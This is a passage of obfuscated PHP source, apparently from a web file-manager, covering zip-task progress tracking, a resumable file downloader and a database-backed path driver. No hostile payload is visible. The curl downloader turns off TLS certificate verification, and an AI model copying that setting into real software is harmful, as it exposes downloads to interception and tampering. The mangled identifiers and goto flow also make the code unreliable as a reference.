A¦âê‚¦µÇ: $D®º‡âÎòš[$FŞ´’ÇÇÀ[975]] = 0; $D®º‡âÎòš[$FŞ´’ÇÇÀ[1444]] = 0; $D®º‡âÎòš[$FŞ´’ÇÇÀ[1445]] = 0; goto D†õáÓÉ; eßˆ»Õ¨ : $bÊÈ™Ù¢ùÜ = IO::infoWithChildren($fÉ‰èœÚë¾); $aÆ–ÍØ’ñ­ = 0; $D®º‡âÎòš[$FŞ´’ÇÇÀ[1450]] = array($FŞ´’ÇÇÀ[1451] => $aÆ–ÍØ’ñ­ + 1, $FŞ´’ÇÇÀ[391] => $bÊÈ™Ù¢ùÜ[$FŞ´’ÇÇÀ[28]], $FŞ´’ÇÇÀ[75] => $bÊÈ™Ù¢ùÜ[$FŞ´’ÇÇÀ[75]], $FŞ´’ÇÇÀ[470] => $bÊÈ™Ù¢ùÜ[$FŞ´’ÇÇÀ[470]] ? $bÊÈ™Ù¢ùÜ[$FŞ´’ÇÇÀ[470]] : $bÊÈ™Ù¢ùÜ[$FŞ´’ÇÇÀ[75]]); goto e§Ú£Œë¶; cÁùœè›’Ş: $this->update(); self::log($FŞ´’ÇÇÀ[1469] . json_encode(array($D®º‡âÎòš, $bÊÈ™Ù¢ùÜ))); goto C×¬ñÂã¤; C×¬ñÂã¤: } public function nameParse($e™¶¹ÎÄ¡Í) { goto C±æ‰±½øÙ; C±æ‰±½øÙ: $A”êŠê¨»ƒ =& $_SERVER[Ä¿Ş°¨]; $b•Ü‘ì¡Úå =& $this->task; if ($b•Ü‘ì¡Úå[$A”êŠê¨»ƒ[1467]] == $A”êŠê¨»ƒ[1025]) { $b•Ü‘ì¡Úå[$A”êŠê¨»ƒ[1467]] = $A”êŠê¨»ƒ[297]; $b•Ü‘ì¡Úå[$A”êŠê¨»ƒ[1449]] = 0; $b•Ü‘ì¡Úå[$A”êŠê¨»ƒ[692]] = 0; } goto FĞÑ¥ŠóĞ; D´‹×£á„Î: $this->update(); goto CÄö¯ÑŒï; FĞÑ¥ŠóĞ: $c›ïíĞ£´ = get_path_this($e™¶¹ÎÄ¡Í); if (strstr($c›ïíĞ£´, $A”êŠê¨»ƒ[91])) { $b•Ü‘ì¡Úå[$A”êŠê¨»ƒ[975]] += 1; $b•Ü‘ì¡Úå[$A”êŠê¨»ƒ[963]] += 1; } $b•Ü‘ì¡Úå[$A”êŠê¨»ƒ[1442]] = $e™¶¹ÎÄ¡Í; goto D´‹×£á„Î; CÄö¯ÑŒï: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $cÇ¿ÑÇ™ =& $_SERVER[Ä¿Ş°¨]; parent::startAfter(); Hook::bind($cÇ¿ÑÇ™[1470], array($this, $cÇ¿ÑÇ™[1465])); $f–å–¯ší£ =& $this->task; $f–å–¯ší£[$cÇ¿ÑÇ™[1467]] = $cÇ¿ÑÇ™[1025]; if (!$f–å–¯ší£[$cÇ¿ÑÇ™[1304]]) { $f–å–¯ší£[$cÇ¿ÑÇ™[1304]] = LNG($cÇ¿ÑÇ™[1471]); } } protected function endAfter() { $FÃ‹é«È´‹ =& $_SERVER[Ä¿Ş°¨]; parent::endAfter(); Hook::unbind($FÃ‹é«È´‹[1470], array($this, $FÃ‹é«È´‹[1465])); } public function updateAfter() { $D«ğîœ„ßË =& $_SERVER[Ä¿Ş°¨]; $D·µË‰½Ÿ¸ =& $this->task; if (!$D·µË‰½Ÿ¸[$D«ğîœ„ßË[963]] || !$D·µË‰½Ÿ¸[$D«ğîœ„ßË[692]]) { return; } if ($D·µË‰½Ÿ¸[$D«ğîœ„ßË[1467]] == $D«ğîœ„ßË[1025]) { $BÍ¼î¥†§‡ = $D·µË‰½Ÿ¸[$D«ğîœ„ßË[1445]]; if ($D·µË‰½Ÿ¸[$D«ğîœ„ßË[1446]] != $D«ğîœ„ßË[1025]) { $BÍ¼î¥†§‡ = 0; } $C‹Œã–±˜Î = ($D·µË‰½Ÿ¸[$D«ğîœ„ßË[1449]] + $BÍ¼î¥†§‡) / $D·µË‰½Ÿ¸[$D«ğîœ„ßË[692]]; $D·µË‰½Ÿ¸[$D«ğîœ„ßË[1400]] = $C‹Œã–±˜Î * 0.3; } else { if ($D·µË‰½Ÿ¸[$D«ğîœ„ßË[1467]] == $D«ğîœ„ßË[297]) { $C‹Œã–±˜Î = $D·µË‰½Ÿ¸[$D«ğîœ„ßË[975]] / $D·µË‰½Ÿ¸[$D«ğîœ„ßË[963]]; $D·µË‰½Ÿ¸[$D«ğîœ„ßË[1400]] = 0.3 + $C‹Œã–±˜Î * 0.5; } else { if ($D·µË‰½Ÿ¸[$D«ğîœ„ßË[1467]] == $D«ğîœ„ßË[102]) { $C‹Œã–±˜Î = 0; if ($D·µË‰½Ÿ¸[$D«ğîœ„ßË[1444]]) { $C‹Œã–±˜Î = $D·µË‰½Ÿ¸[$D«ğîœ„ßË[1445]] / $D·µË‰½Ÿ¸[$D«ğîœ„ßË[1444]]; } $D·µË‰½Ÿ¸[$D«ğîœ„ßË[1400]] = 0.3 + 0.5 + $C‹Œã–±˜Î * 0.2; } } } if ($D·µË‰½Ÿ¸[$D«ğîœ„ßË[1400]] > 0) { $fŞÛ©ÙƒÚ = timeFloat() - $D·µË‰½Ÿ¸[$D«ğîœ„ßË[1402]] - $D·µË‰½Ÿ¸[$D«ğîœ„ßË[1405]]; $D·µË‰½Ÿ¸[$D«ğîœ„ßË[1406]] = $fŞÛ©ÙƒÚ * (1 - $D·µË‰½Ÿ¸[$D«ğîœ„ßË[1400]]) / $D·µË‰½Ÿ¸[$D«ğîœ„ßË[1400]]; } } public function copyFileStart($b±Éå²âç, $f¥é¿£®ç¶, $A©á…¡ˆ¥Œ, $bª†ùËİÙÛ, $f²î‚óÍ·Ÿ, $b‘·‚«¸ˆˆ) { $cì†’Şœ”¶ =& $_SERVER[Ä¿Ş°¨]; parent::copyFileStart($b±Éå²âç, $f¥é¿£®ç¶, $A©á…¡ˆ¥Œ, $bª†ùËİÙÛ, $f²î‚óÍ·Ÿ, $b‘·‚«¸ˆˆ); $FŒ´£ååğ­ =& $this->task; if ($FŒ´£ååğ­[$cì†’Şœ”¶[1467]] == $cì†’Şœ”¶[297]) { $FŒ´£ååğ­[$cì†’Şœ”¶[1467]] = $cì†’Şœ”¶[102]; } $this->update(); } public function copyFileEnd($AãØà˜¦¢, $fŞÇ×†°§Ì, $E®„¶¸¬ÙĞ, $BóÅò‚Ë©§, $cíÌÕÓ¼¶, $d´¿ö´—¼³) { $c©Ç›öéß =& $_SERVER[Ä¿Ş°¨]; $e‹ÌïÜ©†Š =& $this->task; $e‹ÌïÜ©†Š[$c©Ç›öéß[1445]] = $e‹ÌïÜ©†Š[$c©Ç›öéß[1444]]; $e‹ÌïÜ©†Š[$c©Ç›öéß[1449]] += $e‹ÌïÜ©†Š[$c©Ç›öéß[1444]]; $e‹ÌïÜ©†Š[$c©Ç›öéß[1446]] = $c©Ç›öéß[33]; $this->update(); } public function nameParse($AÃéØõøÈù) { $cÃâ¦©…”è =& $_SERVER[Ä¿Ş°¨]; $E÷‰³†£œ =& $this->task; if ($E÷‰³†£œ[$cÃâ¦©…”è[975]] < $E÷‰³†£œ[$cÃâ¦©…”è[963]]) { $aàé¸…  = get_path_this($AÃéØõøÈù); if (strstr($aàé¸… , $cÃâ¦©…”è[91])) { $E÷‰³†£œ[$cÃâ¦©…”è[975]] += 1; } } if ($E÷‰³†£œ[$cÃâ¦©…”è[1467]] == $cÃâ¦©…”è[1025]) { $E÷‰³†£œ[$cÃâ¦©…”è[1467]] = $cÃâ¦©…”è[297]; } $E÷‰³†£œ[$cÃâ¦©…”è[1442]] = $AÃéØõøÈù; $this->update(); } } class Downloader { static function start($EšŸÔ»„ˆ†, $FŒà¿ÍÙØ´, $e¾­Ó„Úæ = 10) { goto aí†Ö¸¦À¼; C¡¿—Üêñ: if (is_file($E¯›¡êƒØ–)) { $bçò¾ìÁ±è = file_get_contents($E¯›¡êƒØ–); $AÜ¬ééë¯ = json_decode($bçò¾ìÁ±è, 1); } if (file_exists($FŒà¿ÍÙØ´) && $BŸêö¬İñ == filesize($FŒà¿ÍÙØ´)) { @unlink($e•„ˆ£›Á÷); @unlink($E¯›¡êƒØ–); return array($c‘˜ƒÓ«[1017] => !0, $c‘˜ƒÓ«[1019] => $c‘˜ƒÓ«[1475]); } if ($AÜ¬ééë¯[$c‘˜ƒÓ«[321]] != $BŸêö¬İñ) { $AÜ¬ééë¯ = array($c‘˜ƒÓ«[321] => $BŸêö¬İñ); } goto b†­ µÊ; b†­ µÊ: if ($BİŒ£á¤Ì > $BŸêö¬İñ) { @unlink($e•„ˆ£›Á÷); } file_put_contents($E¯›¡êƒØ–, json_encode($AÜ¬ééë¯)); $c…â‡¯Ë = self::fileDownloadCurl($EšŸÔ»„ˆ†, $FŒà¿ÍÙØ´, !0, $BİŒ£á¤Ì, $BŸêö¬İñ); goto aËÍË™“ÚÔ; e¯³ó£È—»: $BŸêö¬İñ = intval($DóˆÖëÊš™[$c‘˜ƒÓ«[321]]); if (file_exists($e•„ˆ£›Á÷) && time() - filemtime($e•„ˆ£›Á÷) < 3) { return array($c‘˜ƒÓ«[1017] => !1, $c‘˜ƒÓ«[1019] => $c‘˜ƒÓ«[1474]); } $AÜ¬ééë¯ = array(); goto C¡¿—Üêñ; aËÍË™“ÚÔ: if ($c…â‡¯Ë[$c‘˜ƒÓ«[1017]]) { @unlink($E¯›¡êƒØ–); } return $c…â‡¯Ë; goto EÍ¸¸•âÙ; aí†Ö¸¦À¼: $c‘˜ƒÓ« =& $_SERVER[Ä¿Ş°¨]; if (!request_url_safe($EšŸÔ»„ˆ†)) { return array($c‘˜ƒÓ«[1017] => !1, $c‘˜ƒÓ«[1019] => $c‘˜ƒÓ«[1022]); } $E¯›¡êƒØ– = $FŒà¿ÍÙØ´ . $c‘˜ƒÓ«[1472]; goto d‘ÂÍ„øÓ¹; Aá˜ƒ”Üšø: if (!$EšŸÔ»„ˆ†) { return array($c‘˜ƒÓ«[1017] => !1, $c‘˜ƒÓ«[1019] => $c‘˜ƒÓ«[1022]); } if (!$DóˆÖëÊš™[$c‘˜ƒÓ«[1266]] || $DóˆÖëÊš™[$c‘˜ƒÓ«[321]] == 0) { @unlink($e•„ˆ£›Á÷); @unlink($FŒà¿ÍÙØ´); $c…â‡¯Ë = self::fileDownloadFopen($EšŸÔ»„ˆ†, $FŒà¿ÍÙØ´, $DóˆÖëÊš™[$c‘˜ƒÓ«[321]]); if ($c…â‡¯Ë[$c‘˜ƒÓ«[1017]]) { return $c…â‡¯Ë; } else { @unlink($e•„ˆ£›Á÷); @unlink($FŒà¿ÍÙØ´); $c…â‡¯Ë = self::fileDownloadCurl($EšŸÔ»„ˆ†, $FŒà¿ÍÙØ´, !1, 0, $DóˆÖëÊš™[$c‘˜ƒÓ«[321]]); @unlink($e•„ˆ£›Á÷); return $c…â‡¯Ë; } } $BİŒ£á¤Ì = is_file($e•„ˆ£›Á÷) ? filesize($e•„ˆ£›Á÷) : 0; goto e¯³ó£È—»; d‘ÂÍ„øÓ¹: $e•„ˆ£›Á÷ = $FŒà¿ÍÙØ´ . $c‘˜ƒÓ«[1473]; if (is_array($EšŸÔ»„ˆ†)) { $DóˆÖëÊš™ = $EšŸÔ»„ˆ†; } else { $DóˆÖëÊš™ = url_header($EšŸÔ»„ˆ†); } $EšŸÔ»„ˆ† = $DóˆÖëÊš™[$c‘˜ƒÓ«[291]]; goto Aá˜ƒ”Üšø; EÍ¸¸•âÙ: } static function fileDownloadFopen($dÅ£¯³Ô‘, $A‰‘›íàÏÎ, $dƒää°Ïîñ = 0) { $e–ãïË‚Ì« =& $_SERVER[Ä¿Ş°¨]; @ini_set($e–ãïË‚Ì«[1476], $e–ãïË‚Ì«[1477]); $AÃ«ó”…ÙŠ = $A‰‘›íàÏÎ . $e–ãïË‚Ì«[1473]; set_timeout(); @unlink($AÃ«ó”…ÙŠ); if ($cÀœÁÛÆ¡Ô = @fopen($dÅ£¯³Ô‘, $e–ãïË‚Ì«[1478])) { goto aÃÈùì‚Œ; aÃÈùì‚Œ: if (!($CÑ¾ô´†­Ô = @fopen($AÃ«ó”…ÙŠ, $e–ãïË‚Ì«[1479]))) { return array($e–ãïË‚Ì«[1017] => !1, $e–ãïË‚Ì«[1019] => $e–ãïË‚Ì«[1480]); } while (!feof($cÀœÁÛÆ¡Ô)) { if (!file_exists($AÃ«ó”…ÙŠ)) { fclose($CÑ¾ô´†­Ô); return array($e–ãïË‚Ì«[1017] => !1, $e–ãïË‚Ì«[1019] => $e–ãïË‚Ì«[1481]); } clearstatcache(); if ($dƒää°Ïîñ > 0 && $dƒää°Ïîñ == filesize(iconv_system($AÃ«ó”…ÙŠ))) { break; } fwrite($CÑ¾ô´†­Ô, fread($cÀœÁÛÆ¡Ô, 1024 * 8), 1024 * 8); } fclose($CÑ¾ô´†­Ô); goto dÊë¯íº‘Â; A–™ì´§Ú‘: self::checkGzip($AÃ«ó”…ÙŠ); if (!@rename($AÃ«ó”…ÙŠ, $A‰‘›íàÏÎ)) { usleep(round(rand(0, 1000) * 50)); @unlink($A‰‘›íàÏÎ); $b¦³¶·¤ñ = @rename($AÃ«ó”…ÙŠ, $A‰‘›íàÏÎ); if (!$b¦³¶·¤ñ) { return array($e–ãïË‚Ì«[1017] => !1, $e–ãïË‚Ì«[1019] => $e–ãïË‚Ì«[1483]); } } return array($e–ãïË‚Ì«[1017] => !0, $e–ãïË‚Ì«[1019] => $e–ãïË‚Ì«[690]); goto f‹–Ø×ö÷­; dÊë¯íº‘Â: fclose($cÀœÁÛÆ¡Ô); $FêŒ†¹È¾• = filesize(iconv_system($AÃ«ó”…ÙŠ)); if ($dƒää°Ïîñ != 0 && $FêŒ†¹È¾• != $dƒää°Ïîñ) { return array($e–ãïË‚Ì«[1017] => !1, $e–ãïË‚Ì«[1019] => $e–ãïË‚Ì«[1482]); } goto A–™ì´§Ú‘; f‹–Ø×ö÷­: } else { return array($e–ãïË‚Ì«[1017] => !1, $e–ãïË‚Ì«[1019] => $e–ãïË‚Ì«[1484]); } } static function fileDownloadCurl($FŞ£ÀÖ÷³², $b¿µÑ‹¬Ï¹, $cĞò·¯åŒÀ = false, $c¸Š»ÑÉ° = 0, $Fø¼ŒÂËâª = 0) { goto aù‡‚˜ø•‹; E”¶ö„Œ×: curl_close($AÚ¶šÛŞ„…); fclose($eŒ„ƒÃ‰šó); $câ…‰öìÛ² = filesize(iconv_system($cÄêİÁŸÅ¼)); goto EŠšğâÛßô; e²Œùåù¶Ñ: curl_setopt($AÚ¶šÛŞ„…, CURLOPT_USERAGENT, $d‹º×á©µè[1477]); $fì³˜Ö†·Å = curl_exec($AÚ¶šÛŞ„…); curl_progress_end($AÚ¶šÛŞ„…); goto E”¶ö„Œ×; AóØÁ”Ÿ„: $eŒ„ƒÃ‰šó = @fopen($cÄêİÁŸÅ¼, $d‹º×á©µè[967]); if (!$eŒ„ƒÃ‰šó) { return array($d‹º×á©µè[1017] => !1, $d‹º×á©µè[1019] => $d‹º×á©µè[1485]); } $AÚ¶šÛŞ„… = curl_init($FŞ£ÀÖ÷³²); goto b“¬ù†í¼; EŠšğâÛßô: if ($câ…‰öìÛ² < $Fø¼ŒÂËâª && $Fø¼ŒÂËâª != 0) { return array($d‹º×á©µè[1017] => !1, $d‹º×á©µè[1019] => $d‹º×á©µè[1474]); } if ($câ…‰öìÛ² > $Fø¼ŒÂËâª && $Fø¼ŒÂËâª != 0) { return array($d‹º×á©µè[1017] => !1, $d‹º×á©µè[1019] => $d‹º×á©µè[1482]); } if ($fì³˜Ö†·Å && filesize($cÄêİÁŸÅ¼) != 0) { self::checkGzip($cÄêİÁŸÅ¼); if (!@rename($cÄêİÁŸÅ¼, $b¿µÑ‹¬Ï¹)) { @unlink($b¿µÑ‹¬Ï¹); $fì³˜Ö†·Å = @rename($cÄêİÁŸÅ¼, $b¿µÑ‹¬Ï¹); if (!$fì³˜Ö†·Å) { return array($d‹º×á©µè[1017] => !1, $d‹º×á©µè[1019] => $d‹º×á©µè[1487]); } } return array($d‹º×á©µè[1017] => !0, $d‹º×á©µè[1019] => $d‹º×á©µè[690]); } goto D×ÅÇÄÁ; D×ÅÇÄÁ: return array($d‹º×á©µè[1017] => !1, $d‹º×á©µè[1019] => $d‹º×á©µè[1488]); goto CÛ•ºˆäµ‘; aÆäŸæùœ¢: curl_setopt($AÚ¶šÛŞ„…, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($AÚ¶šÛŞ„…, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($AÚ¶šÛŞ„…, CURLOPT_SSL_VERIFYHOST, 0); goto bôºÇĞ„Ñ; b“¬ù†í¼: if ($cĞò·¯åŒÀ) { curl_setopt($AÚ¶šÛŞ„…, CURLOPT_RANGE, $c¸Š»ÑÉ° . $d‹º×á©µè[708]); } curl_setopt($AÚ¶šÛŞ„…, CURLOPT_FILE, $eŒ„ƒÃ‰šó); curl_setopt($AÚ¶šÛŞ„…, CURLOPT_REFERER, get_url_link($FŞ£ÀÖ÷³²)); goto aÆäŸæùœ¢; aù‡‚˜ø•‹: $d‹º×á©µè =& $_SERVER[Ä¿Ş°¨]; $cÄêİÁŸÅ¼ = $b¿µÑ‹¬Ï¹ . $d‹º×á©µè[1473]; set_timeout(); goto AóØÁ”Ÿ„; bôºÇĞ„Ñ: curl_setopt($AÚ¶šÛŞ„…, CURLOPT_NOPROGRESS, !1); curl_setopt($AÚ¶šÛŞ„…, CURLOPT_PROGRESSFUNCTION, $d‹º×á©µè[1486]); curl_progress_start($AÚ¶šÛŞ„…); goto e²Œùåù¶Ñ; CÛ•ºˆäµ‘: } static function checkGzip($Bè‡ÓÛŠêò) { goto bÃ¤ŞÊê‘¿; dİÓ—±Èãİ: file_put_contents($Bè‡ÓÛŠêò, $aíæè³Š»); goto A‰±­ëë£; aŞ—Ç¤Êãà: ob_start(); readgzfile($Bè‡ÓÛŠêò); $aíæè³Š» = ob_get_clean(); goto dİÓ—±Èãİ; bÃ¤ŞÊê‘¿: $B„Š‚Ô«â² = $_SERVER[Ä¿Ş°¨][1489]; $Aã°íåù°ğ = file_sub_str($Bè‡ÓÛŠêò, 0, 2); if ($B„Š‚Ô«â² != $Aã°íåù°ğ) { return; } goto aŞ—Ç¤Êãà; A‰±­ëë£: } } goto D ’’¼å´; D‡‰ì°ÒÂ¨: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($d”‰—èŒ…) { $this->pathParse = $d”‰—èŒ…; $this->model = Model($_SERVER[Ä¿Ş°¨][1095]); } public function getPath($c†Ğï’œ’ƒ) { return trim($c†Ğï’œ’ƒ, $_SERVER[Ä¿Ş°¨][8]); } public function pathFather($f¿³ÓùëÁß) { $b¸İÀĞù£¿ = $this->parse($f¿³ÓùëÁß); $b¸İÀĞù£¿ = $this->infoSimple($f¿³ÓùëÁß); return $b¸İÀĞù£¿ ? $b¸İÀĞù£¿[$_SERVER[Ä¿Ş°¨][465]] : !1; } public function getPathName($D……”Ö®³) { $C·Æİí®³½ = $this->infoSimple($D……”Ö®³); return $C·Æİí®³½ ? $C·Æİí®³½[$_SERVER[Ä¿Ş°¨][28]] : !1; } public function getPathOuter($F°ğì‘“ÎÕ) { if (!$F°ğì‘“ÎÕ) { return $F°ğì‘“ÎÕ; } $b´Ã…°›™Û = $this->parse($F°ğì‘“ÎÕ); return KodIO::make($b´Ã…°›™Û[$_SERVER[Ä¿Ş°¨][372]]); } public function copyFolderFromIO($EÜ¹¡âÒ•, $b¾šÂ‹Ö»–, $f¦ê„¢Ê , $BèÇÅœ‹¦ø, $aåÛ—½Òå™) { $CØ‰¿Ô—µ = $this->model->copyFolderFromIO($EÜ¹¡âÒ•, $b¾šÂ‹Ö»–, $f¦ê„¢Ê , $BèÇÅœ‹¦ø, $aåÛ—½Òå™); return KodIO::make($CØ‰¿Ô—µ); } public function isParentOf($dëç‰‘Ğê—, $c¦‹Ã¬…İ) { return $this->model->isParentOf($dëç‰‘Ğê—, $c¦‹Ã¬…İ); } public function mkfile($B‚¦‘–ç‚ , $eŒ«¹¤µ¢ï = '', $aàñ¹²¼šœ = REPEAT_RENAME) { $a…ÛÁìä² =& $_SERVER[Ä¿Ş°¨]; $EØˆ·µÂ¦ = $this->parse($B‚¦‘–ç‚ ); $B‚¦‘–ç‚  = $EØˆ·µÂ¦[$a…ÛÁìä²[372]]; for ($e¾©’³ò = 0; $e¾©’³ò < count($EØˆ·µÂ¦[$a…ÛÁìä²[1096]]); $e¾©’³ò++) { $e¤ÕËÃĞ¥œ = $EØˆ·µÂ¦[$a…ÛÁìä²[1096]][$e¾©’³ò]; if ($e¾©’³ò == count($EØˆ·µÂ¦[$a…ÛÁìä²[1096]]) - 1) { $B‚¦‘–ç‚  = $this->model->mkfile($B‚¦‘–ç‚ , $e¤ÕËÃĞ¥œ, $eŒ«¹¤µ¢ï, $aàñ¹²¼šœ); break; } $B‚¦‘–ç‚  = $this->model->mkdir($B‚¦‘–ç‚ , $e¤ÕËÃĞ¥œ, REPEAT_SKIP); } return $this->getPathOuter($B‚¦‘–ç‚ ); } public function mkdir($aƒÕ´ºÔ†µ, $Dø²–¤ª¿¬ = REPEAT_SKIP) { $e‡éó×‘á¦ =& $_SERVER[Ä¿Ş°¨]; $aóç†­”ğ° = $this->parse($aƒÕ´ºÔ†µ); $aƒÕ´ºÔ†µ = $aóç†­”ğ°[$e‡éó×‘á¦[372]]; for ($Bæ¾Ø‡Íæ¢ = 0; $Bæ¾Ø‡Íæ¢ < count($aóç†­”ğ°[$e‡éó×‘á¦[1096]]); $Bæ¾Ø‡Íæ¢++) { $c‡­Ìï›¤ = $aóç†­”ğ°[$e‡éó×‘á¦[1096]][$Bæ¾Ø‡Íæ¢]; $aƒÕ´ºÔ†µ = $this->model->mkdir($aƒÕ´ºÔ†µ, $c‡­Ìï›¤, $Dø²–¤ª¿¬); } return $this->getPathOuter($aƒÕ´ºÔ†µ); } public function copyFile($Cë¿Øõ»Õ, $cÖíæ²šÍÖ, $b–²ˆ¦ˆÙŸ = REPEAT_REPLACE) { $A¤ÁŒ…Ì“‚ =& $_SERVER[Ä¿Ş°¨]; $D¬‡ÇÈ†›™ = $this->parse($cÖíæ²šÍÖ); $e†©×ëĞ¾ê = $this->model->copy($Cë¿Øõ»Õ, $D¬‡ÇÈ†›™[$A¤ÁŒ…Ì“‚[372]], $b–²ˆ¦ˆÙŸ, $D¬‡ÇÈ†›™[$A¤ÁŒ…Ì“‚[75]]); return $e†©×ëĞ¾ê ? $this->getPathOuter($e†©×ëĞ¾ê) : !1; } public function moveFile($c·ÀçÍñçÃ, $F• ‰˜¿œô, $b»ç¼™Ö”ç = REPEAT_REPLACE) { $CÜ§ˆ¼Ñ… =& $_SERVER[Ä¿Ş°¨]; $cÀíËö˜Õ‰ = $this->parse($F• ‰˜¿œô); $A‡ò ä†öñ = $this->model->move($c·ÀçÍñçÃ, $cÀíËö˜Õ‰[$CÜ§ˆ¼Ñ…[372]], $b»ç¼™Ö”ç, $cÀíËö˜Õ‰[$CÜ§ˆ¼Ñ…[75]]); return $A‡ò ä†öñ ? $this->getPathOuter($A‡ò ä†öñ) : !1; } public function copy($f•¹ÕšŠ¾, $d†–íª¦ÂÙ, $dÁÌµùÍ¿ó = REPEAT_REPLACE) { $b˜òØè„ = $this->parse($d†–íª¦ÂÙ); $eÇË¥•µÆ­ = $this->model->copy($f•¹ÕšŠ¾, $b˜òØè„[$_SERVER[Ä¿Ş°¨][372]], $dÁÌµùÍ¿ó); return $eÇË¥•µÆ­ ? $this->getPathOuter($eÇË¥•µÆ­) : !1; } public function move($EÛˆÅÑªö, $Aâ‚ï˜á‚…, $eÀÜ·Ëäî¤ = REPEAT_REPLACE) { $aë£Œ²÷Ïİ = $this->parse($Aâ‚ï˜á‚…); $BˆÅ¯Ÿ÷Œ£ = $this->model->move($EÛˆÅÑªö, $aë£Œ²÷Ïİ[$_SERVER[Ä¿Ş°¨][372]], $eÀÜ·Ëäî¤); return $BˆÅ¯Ÿ÷Œ£ ? $this->getPathOuter($BˆÅ¯Ÿ÷Œ£) : !1; } public function remove($AéŸÀ­¨§, $eàÃ¸ù‡Ù = true) { return $this->model->remove($AéŸÀ­¨§, $eàÃ¸ù‡Ù); } public function rename($F’ÅÕÕ¡á, $aÒ’¤œĞöš) { $aœ–×ã¦¢‚ = $this->model->rename($F’ÅÕÕ¡á, $aÒ’¤œĞöš); return $aœ–×ã¦¢‚ ? $this->getPathOuter($F’ÅÕÕ¡á) : $aœ–×ã¦¢‚; } public function size($e³¶½÷æ¿Õ) { $D©‚Ùê‰Îí = $this->infoSimple($e³¶½÷æ¿Õ); return $D©‚Ùê‰Îí ? $D©‚Ùê‰Îí[$_SERVER[Ä¿Ş°¨][77]] : 0; } public function infoSimple($bÓîâËİÓé) { return $this->model->sourceInfo($bÓîâËİÓé); } public function info($eƒ›®¦Ä·š) { return $this->infoParse($eƒ›®¦Ä·š); } public function infoAuth($BŸöÉ¡îÖ) { return $this->infoParse($BŸöÉ¡îÖ, !1, !0); } public function infoWithChildren($F†ÀÙË§É) { return $this->infoParse($F†ÀÙË§É, !0); } protected function infoParse($a†Éˆó­Ğå, $F´“ê­±°Ö = false, $D”ÈŸ”ç³œ = false) { if (!$F´“ê­±°Ö) { return $this->model->pathInfo($a†Éˆó­Ğå, $D”ÈŸ”ç³œ); } return $this->model->pathInfoMore($a†Éˆó­Ğå); } public function infoFull($c…ŒìŠ‹) { $d»„±Îá£ =& $_SERVER[Ä¿Ş°¨]; $E¯õäµ¸¢ = explode($d»„±Îá£[8], $c…ŒìŠ‹); $fÛ¾ó´µ£ = implode($d»„±Îá£[8], array_splice($E¯õäµ¸¢, 1)); return $this->model->pathInfoByPath($E¯õäµ¸¢[0], $fÛ¾ó´µ£); } public function hashSimple($Fä…ÃÊÎ’‰) { $føŠŞñ‰¿ =& $_SERVER[Ä¿Ş°¨]; $aİÙªæ¤å = $this->infoWithChildren($Fä…ÃÊÎ’‰); return $aİÙªæ¤å[$føŠŞñ‰¿[158]][$føŠŞñ‰¿[160]]; } public function hashMd5($díá³¢˜Íá) { $A•–’Æ£…‘ =& $_SERVER[Ä¿Ş°¨]; $cÊ¤Å“Ï = $this->infoWithChildren($díá³¢˜Íá); return $cÊ¤Å“Ï[$A•–’Æ£…‘[158]][$A•–’Æ£…‘[159]]; } public function exist($AéƒÌ½œÇ) { $b¸™ØÈÁĞÏ =& $_SERVER[Ä¿Ş°¨]; $c×åÅ¯Åá = $this->parse($AéƒÌ½œÇ); if (!$c×åÅ¯Åá[$b¸™ØÈÁĞÏ[75]]) { return $this->isFile($AéƒÌ½œÇ) || $this->isFolder($AéƒÌ½œÇ); } $F‚©ŞŒ¥®˜ = array($b¸™ØÈÁĞÏ[373] => $c×åÅ¯Åá[$b¸™ØÈÁĞÏ[372]], $b¸™ØÈÁĞÏ[28] => $c×åÅ¯Åá[$b¸™ØÈÁĞÏ[75]]); $d¾µİƒáä‹ = $this->model->where($F‚©ŞŒ¥®˜)->find(); return $d¾µİƒáä‹ ? !0 : !1; } public function isFile($a›¢«¼‰Ì½) { $F‰æ¦àğã¤ =& $_SERVER[Ä¿Ş°¨]; $aòñÁ«ğÌ± = $this->infoSimple($a›¢«¼‰Ì½); return $aòñÁ«ğÌ± && $aòñÁ«ğÌ±[$F‰æ¦àğã¤[375]] == $F‰æ¦àğã¤[83] ? !1 : !0; } public function isFolder($cÙ…„‘Àø) { $E÷¸ç‹ãá =& $_SERVER[Ä¿Ş°¨]; $Dô¸İù˜Ù± = $this->infoSimple($cÙ…„‘Àø); return $Dô¸İù˜Ù± && $Dô¸İù˜Ù±[$E÷¸ç‹ãá[375]] == $E÷¸ç‹ãá[83] ? !0 : !1; } public function listPath($cƒƒ‰êÔöì, $F±ùç•‡Ó« = false) { $dÄ—»¿Ÿà… =& $_SERVER[Ä¿Ş°¨]; if ($cƒƒ‰êÔöì == $dÄ—»¿Ÿà…[33]) { return !1; } $fƒ® ¶÷…² = array($dÄ—»¿Ÿà…[373] => $cƒƒ‰êÔöì); if ($F±ùç•‡Ó«) { return $this->model->listSource($fƒ® ¶÷…², -1); } return $this->model->listSource($fƒ® ¶÷…²); } public function has($f¦¥Ê‹‹Ç, $C¡—™°†ˆ = false, $bÒáä•É¤ = null) { $fÉ¬§¸ÓÆ§ =& $_SERVER[Ä¿Ş°¨]; $díˆ·¢‚ƒ‡ = $this->infoWithChildren($f¦¥Ê‹‹Ç); if ($C¡—™°†ˆ) { return array($fÉ¬§¸ÓÆ§[188] => $díˆ·¢‚ƒ‡[$fÉ¬§¸ÓÆ§[188]], $fÉ¬§¸ÓÆ§[187] => $díˆ·¢‚ƒ‡[$fÉ¬§¸ÓÆ§[187]]); } return $bÒáä•É¤ ? $díˆ·¢‚ƒ‡[$fÉ¬§¸ÓÆ§[188]] : $díˆ·¢‚ƒ‡[$fÉ¬§¸ÓÆ§[187]]; } public function listAll($C¯¹—á°‡) { $BæÃëõ…Ôå = IO::info($this->pathParse[$_SERVER[Ä¿Ş°¨][75]]); if (!$BæÃëõ…Ôå) { return array(); } return $this->model->listAll($C¯¹—á°‡); } public function getContent($a¾›ÅÇÑÈ) { return $this->model->getContent($a¾›ÅÇÑÈ); } public function setContent($e¼˜ˆŒ×Œè, $aø’ Î®¡ = '') { return $this->model->setContent($e¼˜ˆŒ×Œè, $aø’ Î®¡); } public function fileSubstr($eæ‹‹ó„, $b‹ñ¬‘›é…, $e»‘ÓÉ—¸¡) { return $this->model->fileSubstr($eæ‹‹ó„, $b‹ñ¬‘›é…, $e»‘ÓÉ—¸¡); } public function 